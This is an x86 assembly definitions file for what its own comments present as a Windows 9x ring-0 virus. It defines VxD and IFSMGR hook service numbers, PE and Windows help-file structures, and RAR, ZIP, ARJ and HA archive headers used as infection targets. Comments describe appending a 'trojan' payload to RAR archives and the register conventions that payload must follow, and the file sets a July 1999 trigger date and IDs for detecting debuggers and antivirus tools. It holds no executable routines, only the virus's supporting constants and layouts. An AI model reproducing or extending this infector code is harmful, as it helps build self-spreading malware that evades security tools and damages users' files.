COMMENT /
  (C) VBA Ltd. ALL RIGHTS RESERVED.
  E-mail: support@vba.com.by

  THIS PROGRAM IS FREE FOR COMMERCIAL AND NON-COMMERCIAL USE.
 
  REDISTRIBUTION AND USE IN SOURCE AND BINARY FORMS, WITH OR WITHOUT
  MODIFICATION, ARE PERMITTED.
 
  THIS SOFTWARE IS PROVIDED BY VBA LTD. ``AS IS'' AND
  ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
  ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
  OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
  LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
  OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
  SUCH DAMAGE.
/

;DEBUG		=	1		;COMMENTED IF RELEASE \
					;UNCOMMENTED IF DEBUG

HAPPY_YEAR	=	1999
HAPPY_MONTH	=	7
HAPPY_POSSIBLITY =	6

MSG_POSSIBLITY	=	48
NOCHNG_SATT_PSBL =	4
CHNG_SNAME_PSBL	=	8

WAIT_TIME	=	3		;SEC
SLEEP_TIME	=	1		;MIN
MAX_OBJS	=	20
MIN_ARC_FILES	=	10

WE_HERE		=	'!'
OUR_PORT	=	'SK'
STACK_FRAME	=	6

TROJAN_NAME_SIZE =	4+1+3		;XXXX.XXX (FOR EXAMPLE,TEST.TST)
TROJAN_STAMP	=	0FFH		;DATE STAMP: 07/31/1980 (0FFH) AND
					;LOBYTE(TIME)=0, FOR EXAMPLE,00:00:00
;ALSO RAR ARCHIVE MUST HAVE A DATE <= 2 WEEK AGE AT CURRENT DATE.
;NOTE: TROJAN MUST BE APPENED TO A RAR ARCHIVE BY "STORED" METHOD. TROJAN MUST
;PRESERVE DS,ES,SS,ESP,EBP,EBX,EDX REGISTERS AND HAVE IMAGE OF 32BIT SUBROUTINE
;(LAST COMMAND - RETN). ALSO TROJAN MUST HAVE LENGTH <= 2000H BYTES.
;ON TROJAN ENTRY:
;EDX=BEGIN VIRII MEMORY REGION,ESI=BEGIN OF TROJAN,EBP=STACK FRAME FOR VIRII
;INTERNAL VXD CALLS (SEE VXD_CALL SUBROUTINE IN VIRII CODE,YOU MAY ALSO INCLUDE
;THIS SUBROUTINE TO TROJAN FOR EFFECTIVE CALLING VXD SERVICES),DS,ES,SS,CS=
;RING0 FLAT.

LEN_LOADER	=	((168+3)/4)*4
LEN_IOBUFF	=	400H
LEN_HLP_DIR	=	100H+SIZE DOS_HEADER
LEN_MAIN_BUFF	=	0A00H
LEN_PEND_JUNK	=	80H
LEN_FILL_CRYPT	=	12
LEN_FILL_RESTORE=	4*7
MIN_VXDNAME_SIZE=	80

HLP_LEN_LINE	=	102
MIN_RELOC_SIZE	=	0A00H

GET_CUR_VM_HANDLE =	18001H		;VMM
GET_SYSTEM_TIME	=	1803FH
_PAGEFREE	=	18055H
ALLOCATE_GDT_SELECTOR =	18076H
FREE_GDT_SELECTOR =	18077H
HOOK_DEVICE_SERVICE =	18090H
INSTALL_IO_HANDLER =	18096H
GET_CONFIG_DIRECTORY =	180B7H
FATAL_ERROR_HANDLER =	180BEH
_PAGERESERVE	=	1811DH
_PAGECOMMIT	=	1811EH
_ENTERMUSTCOMPLETE =	18135H
_LEAVEMUSTCOMPLETE =	18136H
GET_DDB		=	18146H
_GETVXDNAME	=	1817EH
	
GET_DATE_AND_TIME =	58008H		;VTD

SHELL_MESSAGE	=	178004H		;SHELL

GET_DOSTIME	=	408007H		;IFSMGR
RING0_FILEIO	=	408032H
UNITOBCSPATH	=	408041H
INSTALLAPIHOOK	=	408067H
REMOVEAPIHOOK	=	408068H

WINICE_ID	=	202H
BCHECKER_ID	=	205H
IMMUNER_ID	=	534BH
SIWVID_ID	=	7A5FH

EF_HANG_ON_EXIT	=	1
BYTE_INPUT	=	0
BLOCK_SVC_INTS	=	1
BLOCK_THREAD_IDLE =	10H

PR_FIXED	=	8
PR_SYSTEM	=	80080000H
PC_WRITEABLE	=	20000H
PC_FIXED	=	8
PD_FIXEDZERO	=	3

MAX_PATH	=	260
MAX_DOS_PATH	=	128

IFSFN_WRITE	=	1
IFSFN_CLOSE	=	11
IFSFN_FILEATTRIB =	33
IFSFN_OPEN	=	36
IFSFN_RENAME	=	37

IFSFH_RES_UNC	=	1
IFSFH_RES_NETWORK =	8
IFSFH_RES_LOCAL	=	10H
IFSFH_RES_CFSD	=	80H

ACCESS_READONLY	=	0
ACCESS_WRITEONLY =	1
ACCESS_READWRITE =	2

ACTION_CREATENEW =	10H
ACTION_REPLACEEXISTING = 2
ACTION_CREATEALWAYS =	12H
ACTION_OPENALWAYS =	11H
ACTION_OPENEXISTING =	1

R0_NO_CACHE	=	100H
OPEN_FLAGS_REOPEN =	800H
R0_SWAPPER_CALL	=	1000H
OPEN_FLAGS_COMMIT =	4000H

FILE_FLAG_WILDCARDS =	80000000H

FA_READONLY	=	1
FA_SYSTEM	=	4
FA_LABEL	=	8
FA_DIRECTORY	=	10H
FA_DEVICE	=	40H

FGET_ATTRIBUTES	=	0	; GET ATTRIBUTES OF FILE/DIR
FSET_ATTRIBUTES	=	1	; SET ATTRIBUTES OF FILE/DIR
SET_ATTRIB_MODIFY_DATETIME =	3
SET_ATTRIB_LAST_ACCESS_DATETIME = 5
SET_ATTRIB_CREATION_DATETIME =	7

OPEN_ACCESS_READONLY =	0
OPEN_ACCESS_WRITEONLY =	1
OPEN_ACCESS_READWRITE = 2
OPEN_ACCESS_RO_NOMODLASTACCESS = 4
OPEN_SHARE_DENYREADWRITE = 10H
OPEN_SHARE_DENYWRITE =	20H
OPEN_FLAGS_NOCRITERR =	2000H
FILE_OPEN	=	1
FILE_CREATE	=	10H
FILE_TRUNCATE	=	2

R0_OPENCREATFILE =	0D500H	; OPEN/CREATE A FILE
R0_READFILE	=	0D600H	; READ A FILE, NO CONTEXT
R0_WRITEFILE	=	0D601H	; WRITE TO A FILE, NO CONTEXT
R0_CLOSEFILE	=	0D700H	; CLOSE A FILE
R0_GETFILESIZE	=	0D800H	; GET SIZE OF A FILE
R0_FINDFIRSTFILE =	4E00H	; DO A LFN FINDFIRST OPERATION
R0_FINDNEXTFILE	=	4F00H	; DO A LFN FINDNEXT OPERATION
R0_FINDCLOSEFILE =	0DC00H	; DO A LFN FINDCLOSE OPERATION
R0_FILEATTRIBUTES =	4300H	; GET/SET ATTRIBUTES OF A FILE
R0_DELETEFILE	=	4100H	; DELETE A FILE
R0_GETDISKFREESPACE =	3600H	; GET DISK FREE SPACE

IOREQ		STRUC
IR_LENGTH	DD	?	;0 LENGTH OF USER BUFFER
IR_FLAGS	DB	?	;4 MISC. STATUS FLAGS
IR_USER		DB	?	;5 USER ID FOR THIS REQUEST
IR_SFN		DW	?	;6 SYSTEM FILE NUMBER OF FILE HANDLE
IR_PID		DD	?	;8 PROCESS ID OF REQUESTING TASK
IR_PPATH	DD	?	;C UNICODE PATHNAME
IR_AUX1		DD	?	;10 SECONDARY USER DATA BUFFER (CURDTA)
IR_DATA		DD	?	;14 PTR TO USER DATA BUFFER
IR_OPTIONS	DW	?	;18 REQUEST HANDLING OPTIONS
IR_ERROR	DW	?	;1A ERROR CODE (0 IF OK)
IR_RH		DD	?	;1C RESOURCE HANDLE
IR_FH		DD	?	;20 FILE (OR FIND) HANDLE
IR_POS		DD	?	;24 FILE POSITION FOR REQUEST
IR_AUX2		DD	?	;28 MISC. EXTRA API PARAMETERS
IR_UPATH	DD	?	;2C MISC. EXTRA API PARAMETERS
IR_PEV		DD	?	;30 PTR TO IFSMGR EVENT FOR ASYNC REQUESTS
IR_FSD		DB	64 DUP (?) ;34 PROVIDER WORK SPACE
		ENDS

IR_SIZE		EQU	IR_POS
IR_ATTR2	EQU	IR_POS		; DESTINATION ATTRIBUTES FOR RENAME
IR_ATTR		EQU	IR_LENGTH	; DOS FILE ATTRIBUTE INFO
IR_DATETIME	EQU	IR_AUX2		; OVERLAYED ON RETURN FROM FSD

PATH_ELEMENT	STRUC
PE_LENGTH	DW	?
PE_UNICHARS	DW	?
		ENDS

PARSED_PATH	STRUC
PP_TOTALLENGTH	DW	?
PP_PREFIXLENGTH	DW	?
PP_ELEMENTS	DB	4 DUP (?)
		ENDS

BCS_WANSI	=	0		; USE WINDOWS ANSI SET

_FILETIME	STRUC
DWLOWDATETIME	DD	?
DWHIGHDATETIME	DD	?
		ENDS

DOS_TIME	STRUC
DT_TIME		DW	?
DT_DATE		DW	?
		ENDS

_WIN32_FIND_DATA STRUC
DWFILEATTRIBUTES DD	?
FTCREATIONTIME	DB	(SIZE _FILETIME) DUP (?)
FTLASTACCESSTIME DB	(SIZE _FILETIME) DUP (?)
FTLASTWRITETIME	DB	(SIZE _FILETIME) DUP (?)
NFILESIZEHIGH	DD	?
NFILESIZELOW	DD	?
DWRESERVED0	DD	?
DWRESERVED1	DD	?
CFILENAME	DW	MAX_PATH DUP (?) ; INCLUDES NULL
CALTERNATEFILENAME DW	14 DUP (?)	; INCLUDES NULL
		ENDS

_TYPE		RECORD	RES:1,DPL:2,SYSORNOT:1,STYPE:4

SEL		STRUC
SEL_LIMIT_LOW	DW	?
SEL_BASE_LOW	DW	?
SEL_BASE_LOWH	DB	?
SEL_TYPE	_TYPE	<>
SEL_LIMIT_HIGH	DB	?
SEL_BASE_HIGH	DB	?
		ENDS	

GOFF		MACRO	LBL,DELTA
		IFNB	<DELTA>
LBL		EQU	$-START_CODE32+END_CODE16-DELTA
		ELSE
LBL		EQU	$-START_CODE32+END_CODE16
		ENDIF
		ENDM

BREAK		MACRO
		IFDEF	DEBUG
		INT	3
		ENDIF
		ENDM

;PE FILES SECTION

PE_FLAG_NOT_FIXUP	=	1
PE_FLAG_EXECUTABLE	=	2
PE_FLAG_32BIT		=	100H
PE_FLAG_DLL		=	2000H

OT_FLAG_CODE		=	20H
OT_FLAG_IDATA		=	40H
OT_FLAG_UDATA		=	80H
OT_FLAG_DISCARDABLE	=	02000000H
OT_FLAG_NOTCACHED	=	04000000H
OT_FLAG_NONPAGED	=	08000000H
OT_FLAG_SHARED		=	10000000H
OT_FLAG_EXECUTE		=	20000000H
OT_FLAG_READ		=	40000000H
OT_FLAG_WRITE		=	80000000H

DOS_HEADER	STRUC
DOSH_SIGNATURE	DW	?	; 'MZ'
DOSH_CBLP	DW	?
DOSH_CP		DW	?
DOSH_CRLC	DW	?
DOSH_CPARHDR	DW	?
DOSH_MINALLOC	DW	?
DOSH_MAXALLOC	DW	?
DOSH_SS		DW	?
DOSH_SP		DW	?
DOSH_CSUM	DW	?
DOSH_IP		DW	?
DOSH_CS		DW	?
DOSH_LFARLC	DW	?	; RELOCATION TABLE ADDRESS
DOSH_OVNO	DW	?
DOSH_RES	DW	4 DUP (?)
DOSH_OEMID	DW	?
DOSH_OEMINFO	DW	?
DOSH_RES2	DW	10 DUP (?)
DOSH_LFANEW	DW	?	; NEW EXE HEADER ADDRESS
		ENDS

SD		STRUC
SD_RVA		DD	?
SD_SIZE		DD	?
		ENDS

PE_HEADER	STRUC
PEH_SIGNATURE	DD	?	;PE,0,0
PEH_CPUTYPE	DW	?	;<=162H
PEH_NUMOFOBJECT	DW	?
PEH_TIMEDATE	DD	?
PEH_COFFPOINTER	DD	?
PEH_COFFSIZE	DD	?
PEH_NTHSIZE	DW	?
PEH_FLAGS	DW	?
PEH_MAGIC	DW	?
PEH_LINKMAJOR	DB	?
PEH_LINKMINOR	DB	?
PEH_CODESIZE	DD	?
PEH_IDATASIZE	DD	?
PEH_UDATASIZE	DD	?
PEH_ENTRYPOINT	DD	?
PEH_CODEBASE	DD	?
PEH_DATABASE	DD	?
PEH_IMAGEBASE	DD	?
PEH_OBJALIGN	DD	?
PEH_FILEALIGN	DD	?
PEH_OSMAJOR	DW	?
PEH_OSMINOR	DW	?
PEH_USERMAJOR	DW	?
PEH_USERMINOR	DW	?
PEH_SUBMAJOR	DW	?
PEH_SUBMINOR	DW	?
PEH_RESERVED1	DD	?
PEH_IMAGESIZE	DD	?
PEH_HEADERSIZE	DD	?
PEH_FILECRC	DD	?
PEH_SUBSYSTEM	DW	?
PEH_DLLFLAGS	DW	?
PEH_STACKRES	DD	?
PEH_STACKCOM	DD	?
PEH_HEAPRES	DD	?
PEH_HEAPCOM	DD	?
PEH_LOADFLAGS	DD	?
PEH_NUMRVA	DD	?	;10H
PEH_EXPORT	SD	?
PEH_IMPORT	SD	?
PEH_RESOURCE	SD	?
PEH_EXEPTION	SD	?
PEH_SECURITY	SD	?
PEH_FIXUP	SD	?
PEH_DEBUG	SD	?
PEH_DESCRIPT	SD	?
PEH_MACHINE	SD	?
PEH_TLSRVA	SD	?
PEH_LCONFIG	SD	?
PEH_RESERVED2	SD	?
PEH_IATRVA	SD	?
PEH_BOUNDIMPORT	SD	?
PEH_RESERVED3	SD	?
PEH_RESERVED4	SD	?
		ENDS

OBJECT_TABLE	STRUC
OT_NAME		DB	8 DUP (?)
OT_VIRTSIZE	DD	?
OT_RVA		DD	?
OT_PHYSICALSIZE	DD	?
OT_PHYSICALOFF	DD	?
OT_RESERVED	DB	0CH DUP (?)
OT_FLAGS	DD	?
		ENDS

;WINDOWS HELP FILE (HLP)

HLP_MAGIC	=	35F3FH
HLP_SH_MAGIC	=	36CH
ID_CONFIG	=	4

HLP_START	STRUC
HLP_START_MAGIC		DD	? ;35F3FH
HLP_START_DIRECTORYSTART DD	? ;OFFSET OF FILE_HEADER OF INTERNAL DIRECTORY
HLP_START_FIRSTFREEBLOCK DD	? ;OFFSET OF FREE_HEADER OR -1L IF NO FREE LIST
HLP_START_ENTIREFILESIZE DD	? ;SIZE OF ENTIRE HELP FILE IN BYTES
;CHAR HELPFILECONTENT[ENTIREFILESIZE-16]   THE REMAINDER OF THE HELP FILE
		ENDS

FILE_HEADER	STRUC
FILE_HEADER_RESERVEDSPACE DD	? ;SIZE RESERVED INCLUDING FILE_HEADER
FILE_HEADER_USEDSPACE	DD	? ;SIZE OF INTERNAL FILE IN BYTES
FILE_HEADER_FILEFLAGS	DB	? ;NORMALLY 4
;DB FILECONTENT DUP (USEDSPACE)  THE BYTES CONTAINED IN THE INTERNAL FILE
;DB FREESPACE DUP (RESERVEDSPACE-USEDSPACE-9)
		ENDS

SYSTEM_HEADER	STRUC		;|SYSTEM
SYSTEM_HEADER_MAGIC	DW	? ;36CH
SYSTEM_HEADER_MINOR	DW	? ;HELP FILE FORMAT VERSION NUMBER
				;15 = HC30 WINDOWS 3.0 HELP FILE
				;21 = HC31 WINDOWS 3.1 HELP FILE
				;27 = WMVC/MMVC MEDIA VIEW FILE
				;33 = MVC OR HCW 4.00 WINDOWS 95
SYSTEM_HEADER_MAJOR	DW	? ;1
SYSTEM_HEADER_GENDATE	DD	? ;HELP FILE CREATED SECONDS AFTER 1.1.1980, OR 0
SYSTEM_HEADER_FLAGS	DW	?
;USE MINOR AND FLAGS TO FIND OUT HOW THE HELP FILE WAS COMPRESSED:
;MINOR <= 16		 NOT COMPRESSED, TOPICBLOCKSIZE 2K
;MINOR > 16		 FLAGS=0: NOT COMPRESSED,  TOPICBLOCKSIZE 4K
;			 FLAGS=4: LZ77 COMPRESSED, TOPICBLOCKSIZE 4K
;			 FLAGS=8: LZ77 COMPRESSED, TOPICBLOCKSIZE 2K
;ADDITIONALLY THE HELP FILE MAY USE PHRASE COMPRESSION (OLDSTYLE OR HALL).
;IF MINOR IS 16 OR LESS, THE HELP FILE TITLE FOLLOWS THE SYSTEMHEADER:
;HELPFILETITLE DB ? DUP (?) - ASCIZ STRING
;IF MINOR IS ABOVE 16, ONE OR MORE SYSTEMREC RECORDS FOLLOW INSTEAD UP TO THE
;INTERNAL END OF THE |SYSTEM FILE:
;SYSTEM_HEADER_RECORDTYPE DW	?	;TYPE OF DATA IN RECORD
;SYSTEM_HEADER_DATASIZE	DW	?	;SIZE OF DATA
;SYSTEM_HEADER_DATA	DB	?	;DATASIZE DUP (?)
;THERE ARE DIFFERENT RECORDTYPES DEFINED, EACH STORING DIFFERENT DATA.
;THEY MAINLY CONTAIN WHAT WAS SPECIFIED IN THE HELP PROJECT FILE.
;RECORDTYPE  DATA
;1 TITLE     ASCIZ TITLE	       HELP FILE TITLE
;2 COPYRIGHT ASCIZ COPYRIGHT	       COPYRIGHT NOTICE SHOWN IN ABOUTBOX
;3 CONTENTS  TOPICOFFSET CONTENTS       TOPIC OFFSET OF STARTING TOPIC
;4 CONFIG    ASCIZ MACRO	       ALL MACROS EXECUTED ON OPENING
;5 ICON	    WINDOWS *.ICO FILE	       SEE WIN31WH ON ICON FILE FORMAT
;6 WINDOW    STRUCT		       WINDOWS DEFINED IN THE HPJ-FILE
;7 WINDOW    TYPEDEF STRUCT	       VIEWER 2.0 WINDOWS DEFINED IN MVP-FILE
;8 CITATION  ASCIZ CITATION	       THE CITATION PRINTED
;9 LCID	    DW LCID[4]	       LANGUAGE ID, WINDOWS 95 (HCW 4.00)
;10 CNT	    ASCIZ CONTENTFILENAME    CNT FILE NAME, WINDOWS 95 (HCW 4.00)
;11 CHARSET  DW CHARSET     CHARSET, WINDOWS 95 (HCW 4.00)
;12 DEFFONT  STRUCT		       DEFAULT DIALOG FONT, WINDOWS 95 (HCW 4.00)
;12 FTINDEX  ASCIZ DTYPE	       MULTIMEDIA HELP FILES DTYPES
;13 GROUPS   ASCIZ GROUP	       DEFINED GROUPS, MULTIMEDIA HELP FILE
;14 INDEX_S. ASCIZ INDEXSEPARATORS    SEPARATORS, WINDOWS 95 (HCW 4.00)
;14 KEYINDEX STRUCT		       MULTIMEDIA HELP FILES
;18 LANGUAGE ASCIZ LANGUAGE	       DEFINED LANGUAGE, MULTIMEDIA HELP FILES
;19 DLLMAPS  STRUCT		       DEFINED DLLMAPS, MULTIMEDIA HELP FILES
		ENDS

;RAR ARCHIVE

RAR_SIGN	=	21726152H
RAR_HEAD_SIGN	=	73H
RAR_FILE_SIGN	=	74H
RAR_STORED	=	30H

RAR_HEAD_HDR	STRUC
RAR_HEAD_CRC		DW	?	;TYPE - RESERVED2
RAR_HEAD_TYPE		DB	?	;73H
RAR_HEAD_FLAGS		DW	?
;		0x01    - VOLUME ATTRIBUTE (ARCHIVE VOLUME)
;		0x02    - ARCHIVE COMMENT PRESENT
;		0x04    - ARCHIVE LOCK ATTRIBUTE
;		0x08    - SOLID ATTRIBUTE (SOLID ARCHIVE)
;		0x10    - UNUSED
;		0x20    - AUTHENTICITY INFORMATION PRESENT
RAR_HEAD_SIZE		DW	?
RAR_RESERVED1		DW	?
RAR_RESERVED2		DD	?
		ENDS
;COMMENT BLOCK   PRESENT IF (HEAD_FLAGS & 0x02) != 0

RAR_FILE_HDR	STRUC
RAR_F_HEAD_CRC		DW	?	;0
RAR_F_HEAD_TYPE		DB	?	;2 74H
RAR_F_HEAD_FLAGS	DW	?	;3
;		0x01 - FILE CONTINUED FROM PREVIOUS VOLUME
;		0x02 - FILE CONTINUED IN NEXT VOLUME
;		0x04 - FILE ENCRYPTED WITH PASSWORD
;		0x08 - FILE COMMENT PRESENT
;		0x10 - INFORMATION FROM PREVIOUS FILES IS USED (SOLID FLAG)
;			(FOR RAR 2.0 AND LATER)
;		BITS 7 6 5 (FOR RAR 2.0 AND LATER)
;		0 0 0    - DICTIONARY SIZE   64 KB
;		0 0 1    - DICTIONARY SIZE  128 KB
;		0 1 0    - DICTIONARY SIZE  256 KB
;		0 1 1    - DICTIONARY SIZE  512 KB
;		1 0 0    - DICTIONARY SIZE 1024 KB
;		1 0 1    - RESERVED
;		1 1 0    - RESERVED
;		1 1 1    - FILE IS DIRECTORY
;		(HEAD_FLAGS & 0x8000) == 1, BECAUSE FULL
;		BLOCK SIZE IS HEAD_SIZE + PACK_SIZE
RAR_F_HEAD_SIZE		DW	?	;5
RAR_COMPRESSED_SIZE	DD	?	;7
RAR_ORIGINAL_SIZE	DD	?	;B
RAR_HOST_OS		DB	?	;F DOS=0,WIN32=2
RAR_CRC32		DD	?	;10
RAR_FILE_TIME		DW	?	;14
RAR_FILE_DATE		DW	?	;16
RAR_REQ_VER		DB	?	;18 0FH
RAR_METHOD		DB	?	;19 30H=STORED
RAR_FNAME_SIZE		DW	?	;1A
RAR_FILE_ATTRIB		DD	?	;1C
RAR_FNAME		LABEL	BYTE	;20
		ENDS
;FILE_NAME       FILE NAME - STRING OF NAME_LEN BYTES SIZE
;COMMENT BLOCK   PRESENT IF (HEAD_FLAGS & 0x08) != 0
;????            OTHER EXTRA INCLUDED BLOCKS - RESERVED FOR FUTURE USE

;ZIP ARCHIVE

ZIP_LOCAL_SIGN		=	4034B50H
ZIP_CENTRAL_SIGN	=	2014B50H
ZIP_END_SIGN		=	6054B50H

ZIP_LOCAL_HEADER	STRUC
ZIP_LOC_SIGN_		DD	?	;0 ('PK',3,4)
ZIP_VER_NED_TO_EXTR	DW	?	;4
ZIP_FLAGS		DW	?	;6
ZIP_COMPRESSION_METHOD	DW	?	;8 (0 FOR STORED)
ZIP_FILE_TIME		DW	?	;A
ZIP_FILE_DATE		DW	?	;C
ZIP_CRC_32		DD	?	;E
ZIP_COMPRESSED_SIZE	DD	?	;12
ZIP_UNCOMPRESSED_SIZE	DD	?	;16
ZIP_SIZE_FNAME		DW	?	;1A
ZIP_EXTRA_FIELD_LENGTH	DW	?	;1C
ZIP_LOCAL_FNAME		LABEL	BYTE	;1E
			ENDS
;EXTRA FIELD (VARIABLE SIZE)


ZIP_CENTRAL_HEADER	STRUC
ZIP_CENTR_SIGN_		DD	?	;0 ('PK',1,2)
ZIP_VER_MADE_BY_	DW	?	;4
ZIP_VER_NED_TO_EXTR_	DW	?	;6
ZIP_FLAGS_		DW	?	;8
ZIP_COMPRESSION_METHOD_	DW	?	;A
ZIP_FILE_TIME_		DW	?	;C
ZIP_FILE_DATE_		DW	?	;E
ZIP_CRC_32_		DD	?	;10
ZIP_COMPRESSED_SIZE_	DD	?	;14
ZIP_UNCOMPRESSED_SIZE_	DD	?	;18
ZIP_SIZE_FNAME_		DW	?	;1C
ZIP_EXTRA_FIELD_LENGTH_	DW	?	;1E
ZIP_FILE_COMMENT_LENGTH_ DW	?	;20
ZIP_DISK_NUMBER_START_	DW	?	;22
ZIP_INTRNL_FILE_ATTR_	DW	?	;24
ZIP_EXTRNL_FILE_ATTR_	DD	?	;26
ZIP_REL_OFF_OF_LOC_HDR_ DD	?	;2A
ZIP_CENTRAL_FNAME	LABEL	BYTE	;2E
			ENDS
;EXTRA FIELD (VARIABLE SIZE)
;FILE COMMENT (VARIABLE SIZE)


ZIP_END_HEADER		STRUC
ZIP_END_SIGN_		DD	?		;0 ('PK',5,6)
NUM_OF_THIS_DISK	DW	?		;4
NUM_OF_THE_START_DISK	DW	?		;6
TTL_NUM_OF_ENT_ON_THIS_DISK	DW	?	;8
TTL_NUM_OF_ENT_IN_THE_CENT_DIR	DW	?	;A
SIZE_OF_THE_CENTRAL_DIRECTORY	DD	?	;C
OFF_OF_STRT_OF_CENT_DIRECTORY	DD	?	;10
ZIPFILE_COMMENT_LENGTH		DW	?	;14
			ENDS
;ZIPFILE COMMENT (VARIABLE SIZE)		;16

;ARJ ARCHIVE

ARJ_SIGN	=	0EA60H
ARJ_STORED	=	0

ARJ_HDR_STRUC	STRUC
ARJ_HEADER_ID	DW	?	;2 HEADER ID (COMMENT AND LOCAL FILE) = 0xEA60
ARJ_BAS_HDR_SIZE DW	?	;28 BASIC HEADER SIZE (FROM 'FIRST_HDR_SIZE' THRU 'COMMENT' BELOW)
;= FIRST_HDR_SIZE + STRLEN(FILENAME) + 1 + STRLEN(COMMENT) + 1
;= 0 IF END OF ARCHIVE
ARJ_FIRST_HDR_SIZE DB	?	;1E FIRST_HDR_SIZE (SIZE UP TO 'EXTRA DATA')
ARJ_VER_NUM	DB	?	;06 ARCHIVER VERSION NUMBER
ARJ_MIN_VER	DB	?	;01 MINIMUM ARCHIVER VERSION TO EXTRACT
ARJ_HOST_OS	DB	?	;00 HOST OS (0 = MSDOS)
ARJ_FLAGS	DB	?	;10 ARJ FLAGS
		;(0x01 = GARBLED_FLAG) INDICATES PASSWORDED FILE
		;(0x02 = RESERVED)
		;(0x04 = VOLUME_FLAG)  INDICATES CONTINUED FILE TO NEXT VOLUME
		;(0x08 = EXTFILE_FLAG) INDICATES FILE STARTING POSITION FIELD
		;(0x10 = PATHSYM_FLAG) INDICATES PATH TRANSLATED
ARJ_COMPRESS_METHOD DB	?	;00 METHOD (0 = STORED)
ARJ_FILE_TYPE	DB	?	;00 0=BINARY, 1=TEXT
ARJ_RESERVED	DB	?	;(??? LAST BYTE OF TIME STAMP OF ARJ FILE)
ARJ_FILE_TIME	DW	?	;DATE TIME STAMP MODIFIED
ARJ_FILE_DATE	DW	?
ARJ_COMPRESSED_SIZE DD	?	;COMPRESSED SIZE
ARJ_ORIGINAL_SIZE DD	?	;ORIGINAL SIZE
ARJ_CRC32	DD	?	;ORIGINAL FILE'S CRC
ARJ_ENTRYNAME_POS DW	?	;0 ENTRYNAME POSITION IN FILENAME
ARJ_FILE_ACCESS_MODE DW	?	;0 FILE ACCESS MODE
ARJ_HOST_DATA	DW	?	;0 HOST DATA (CURRENTLY NOT USED)
ARJ_FNAME	LABEL	BYTE
; ?  EXTRA DATA (IF SET EXTFILE_FLAG)
;    4 BYTES FOR EXTENDED FILE POSITION
; ?  FILENAME (NULL-TERMINATED)
; ?  COMMENT  (NULL-TERMINATED)
; 4  BASIC HEADER CRC
; 2  1ST EXTENDED HEADER SIZE (0 IF NONE) = 0
; ?  1ST EXTENDED HEADER
; 4  1ST EXTENDED HEADER'S CRC (NOT PRESENT IF 0 EXTENDED HEADER SIZE)
; ...
; ?  COMPRESSED FILE
		ENDS

;HA ARCHIVE

HA_SIGN		=	4148H
HA_STORED	=	20H

;HAFILE
;0000 	HA
;0002	CNT
;0004	HDR1
;.	FILE1
;.	HDR2
;.	FILE2

HA_MAIN_HEADER	STRUC
HA_M_SIGN	DW	?		;0 HA = IDENTIFIER FOR HA ARCHIVE
HA_M_FILE_CNT	DW	?		;2 NUMBER OF FILES IN ARCHIVE
		ENDS

HA_FILE_HEADER	STRUC
HA_VER_METHOD	DB	?		;0 VER<<4 | TYPE TYPE 0-CPY,1-ASC,2-HSC
					;  0xE-DIR 0xF-SPECIAL (20H FOR CPY)
HA_COMPRESS_SIZE DD	?		;1
HA_ORIGINAL_SIZE DD	?		;5
HA_CRC32	DD	?		;9
HA_FILE_TIME	DW	?		;D
HA_FILE_DATE	DW	?		;F
HA_PATH		DB	?		;11 (ZERO IF ISN'T PRESENT) NOTE: ALL
					;DIRPATHS SEPARATED BY 0xFF CODE
		ENDS			;12

;+N	0
;+1	NAME
;+N	0
;+1	LENGTH OF MACHINE SPECIFIC INFORMATION (02H)
;+1	MACHINE SPECIFIC INFORMATION:
;	+0 SYSTEM TYPE (0-DOS,1-LINUX,[DEFAULT=1])
;	+1 FILE ATTRIBUTES (BYTE)
